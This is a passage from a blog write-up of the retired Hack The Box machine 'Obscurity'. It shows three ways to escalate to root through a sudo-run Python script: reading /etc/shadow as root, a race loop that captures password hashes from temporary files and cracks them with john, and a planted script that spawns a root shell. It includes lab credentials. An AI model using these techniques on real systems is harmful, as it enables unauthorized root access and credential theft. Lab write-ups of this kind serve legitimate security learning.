    <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">)</span>
    <span class="n">passW</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter password: "</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">passwords</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span> 
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(.</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">realPass</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]:</span>
            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'$'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid user"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="s">'$6$'</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="s">'$'</span>
    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span>

    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="p">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>

    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Authed!"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Incorrect pass"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="p">,</span><span class="n">path</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">traceback</span><span class="p">.</span><span class="n">print_exc</span><span class="p">()</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">+</span> <span class="s">"@Obscure$ "</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'sudo'</span><span class="p">,</span> <span class="s">'-u'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]]</span>
        <span class="n">cmd</span><span class="p">.</span><span class="n">extend</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>

        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Output: '</span> <span class="o">+</span> <span class="n">o</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Error: '</span>  <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
</pre></table></code></div></div><p>Its a simple script that Ask the user to <code class="language-plaintext highlighter-rouge">Authenticate</code> the user and if the <code class="language-plaintext highlighter-rouge">user</code> is <code class="language-plaintext highlighter-rouge">Authenticated</code> we can run commands as <code class="language-plaintext highlighter-rouge">root</code>. since the two lines saying everything</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cmd <span class="o">=</span> <span class="o">[</span><span class="s1">'sudo'</span>, <span class="s1">'-u'</span>,  session[<span class="s1">'user'</span><span class="o">]]</span>
proc <span class="o">=</span> subprocess.Popen<span class="o">(</span>cmd, <span class="nv">stdout</span><span class="o">=</span>subprocess.PIPE, <span class="nv">stderr</span><span class="o">=</span>subprocess.PIPE<span class="o">)</span>
</pre></table></code></div></div><p>Lets get started our first <code class="language-plaintext highlighter-rouge">method</code></p><blockquote><p>Run the script as root</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>robert@obscure:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/home/robert/BetterSSH/BetterSSH.py"</span>, line 24, <span class="k">in</span> &lt;module&gt;
    with open<span class="o">(</span><span class="s1">'/tmp/SSH/'</span>+path, <span class="s1">'w'</span><span class="o">)</span> as f:
FileNotFoundError: <span class="o">[</span>Errno 2] No such file or directory: <span class="s1">'/tmp/SSH/nLuohR80'</span>
</pre></table></code></div></div><p>So…here i got a error that the Directory <code class="language-plaintext highlighter-rouge">SSH</code> Doesnt exist…lets make it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>robert@obscure:/tmp<span class="nv">$ </span><span class="nb">mkdir </span>SSH
</pre></table></code></div></div><blockquote><p>Run the script again</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>robert@obscure:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
</pre></table></code></div></div><p>Now we are <code class="language-plaintext highlighter-rouge">Authed!</code> Now..we can run any commands by <code class="language-plaintext highlighter-rouge">-u root command</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>robert@Obscure<span class="nv">$ </span><span class="nt">-u</span> root <span class="nb">whoami
</span>Output: root


robert@Obscure<span class="err">$</span>
</pre></table></code></div></div><blockquote><p>Shadow file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>robert@Obscure<span class="nv">$ </span><span class="nt">-u</span> root <span class="nb">cat</span> /etc/shadow
Output: root:<span class="nv">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span>:18226:0:99999:7:::
daemon:<span class="k">*</span>:18113:0:99999:7:::
bin:<span class="k">*</span>:18113:0:99999:7:::
sys:<span class="k">*</span>:18113:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:18113:0:99999:7:::
games:<span class="k">*</span>:18113:0:99999:7:::
man:<span class="k">*</span>:18113:0:99999:7:::
lp:<span class="k">*</span>:18113:0:99999:7:::
mail:<span class="k">*</span>:18113:0:99999:7:::
news:<span class="k">*</span>:18113:0:99999:7:::
uucp:<span class="k">*</span>:18113:0:99999:7:::
proxy:<span class="k">*</span>:18113:0:99999:7:::
www-data:<span class="k">*</span>:18113:0:99999:7:::
backup:<span class="k">*</span>:18113:0:99999:7:::
list:<span class="k">*</span>:18113:0:99999:7:::
irc:<span class="k">*</span>:18113:0:99999:7:::
gnats:<span class="k">*</span>:18113:0:99999:7:::
nobody:<span class="k">*</span>:18113:0:99999:7:::
systemd-network:<span class="k">*</span>:18113:0:99999:7:::
systemd-resolve:<span class="k">*</span>:18113:0:99999:7:::
syslog:<span class="k">*</span>:18113:0:99999:7:::
messagebus:<span class="k">*</span>:18113:0:99999:7:::
_apt:<span class="k">*</span>:18113:0:99999:7:::
lxd:<span class="k">*</span>:18113:0:99999:7:::
uuidd:<span class="k">*</span>:18113:0:99999:7:::
dnsmasq:<span class="k">*</span>:18113:0:99999:7:::
landscape:<span class="k">*</span>:18113:0:99999:7:::
pollinate:<span class="k">*</span>:18113:0:99999:7:::
sshd:<span class="k">*</span>:18163:0:99999:7:::
robert:<span class="nv">$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/:18163:0:99999:7:::
</pre></table></code></div></div><h2 id="method-2-intended">Method 2 (intended)</h2><p>if we read the <code class="language-plaintext highlighter-rouge">content</code> of the file <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> we can see that its reading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file and putting it in a random file generated. in the dir <code class="language-plaintext highlighter-rouge">/tmp/SSH/</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">passwords</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span> 
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
</pre></table></code></div></div><p>So what we gonna do</p><ul><li>Run a <code class="language-plaintext highlighter-rouge">infinte</code> <strong>loop</strong> to read the every file in /tmp/SSH/<li>Run the <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> as root<li>Grab the hash</ul><blockquote><p>Run the loop</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@obscure:~# <span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do </span><span class="nb">cat</span> /tmp/SSH/<span class="k">*</span> 2&gt;/dev/null<span class="p">;</span><span class="k">done</span>
</pre></table></code></div></div><blockquote><p>Run the python script</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>robert@obscure:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure<span class="nv">$ </span>
</pre></table></code></div></div><blockquote><p>Output on our Loop</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>robert@obscure:~<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do </span><span class="nb">cat</span> /tmp/SSH/<span class="k">*</span> 2&gt;/dev/null<span class="p">;</span><span class="k">done
</span>root
<span class="nv">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span>
18226
0
99999
7




robert
<span class="nv">$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
</pre></table></code></div></div><h2 id="cracking-the-root-hash">Cracking the root hash</h2><blockquote><p>hash</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  obscurity <span class="nb">cat hash</span> 
<span class="nv">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  obscurity john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 128/128 XOP 2x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
mercedes         <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2020-05-09 11:18<span class="o">)</span> 1.388g/s 711.1p/s 711.1c/s 711.1C/s angelo..letmein
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>And we got password for the user <code class="language-plaintext highlighter-rouge">root</code></p><h2 id="method-3-unintended">Method 3 (unintended)</h2><p>This Is the <code class="language-plaintext highlighter-rouge">unintended</code> method……………..</p><p>If you look at the <code class="language-plaintext highlighter-rouge">dir</code> <strong>/home/robert/BetterSSH</strong> we have the permission to <code class="language-plaintext highlighter-rouge">rename</code> the dir name, So its easy to rename it to any other name and make your own <code class="language-plaintext highlighter-rouge">Dir</code> called <code class="language-plaintext highlighter-rouge">BetterSSH</code> and then make a file inside it called <code class="language-plaintext highlighter-rouge">BetterSSH.py</code> since the user <code class="language-plaintext highlighter-rouge">robert</code> can run the <code class="language-plaintext highlighter-rouge">script</code> as root , it will run our custom script that contains the code to spawn <code class="language-plaintext highlighter-rouge">bash</code>.And running the script we are <code class="language-plaintext highlighter-rouge">root</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>robert@obscure:~<span class="nv">$ </span><span class="nb">mv </span>BetterSSH BS
robert@obscure:~<span class="nv">$ </span><span class="nb">mkdir </span>BetterSSH
robert@obscure:~<span class="nv">$ </span><span class="nb">touch </span>BetterSSH/BetterSSH.py
</pre></table></code></div></div><p>And now just use the following simple code to spawn a <code class="language-plaintext highlighter-rouge">bash</code> shell.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>robert@obscure:~/BetterSSH<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
root@obscure:~/BetterSSH# <span class="nb">whoami
</span>root
root@obscure:~/BetterSSH#
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@obscure:/root# <span class="nb">cat </span>root.txt
512fd--------------------------9e3
root@obscure:/root# 
</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >Fuzzing</a> <a href="/tags/wfuzz/" class="post-tag no-text-decoration" >wfuzz</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a> <a href="/tags/exec%28%29/" class="post-tag no-text-decoration" >exec()</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox obscurity writeup - 0xPrashant&url=http://localhost:4000/posts/htb-obsecurity/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox obscurity writeup - 0xPrashant&u=http://localhost:4000/posts/htb-obsecurity/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox obscurity writeup - 0xPrashant&url=http://localhost:4000/posts/htb-obsecurity/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-cache/"><div class="card-body"> <span class="timeago small" > May 10 <i class="unloaded">2020-05-10T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cache writeup</h3><div class="text-muted small"><p> I got the root flag first becasue i was able to pwn root wihout getting ash user credentials Introduction@cache:~$ Column Details Name Cache ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-akerva/"><div class="card-body"> <span class="timeago small" > Jun 12 <i class="unloaded">2020-06-12T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Fortress Akerva writeup</h3><div class="text-muted small"><p> Introduction@Akerva:~$ Column Details Name Akerva IP 10.13.37.11 Category Fortress Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-admirer/" class="btn btn-outline-primary"><p>Hackthebox Admirer writeup</p></a> <a href="/posts/htb-cache/" class="btn btn-outline-primary"><p>Hackthebox Cache writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-obsecurity/'; this.page.identifier = '/posts/htb-obsecurity/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 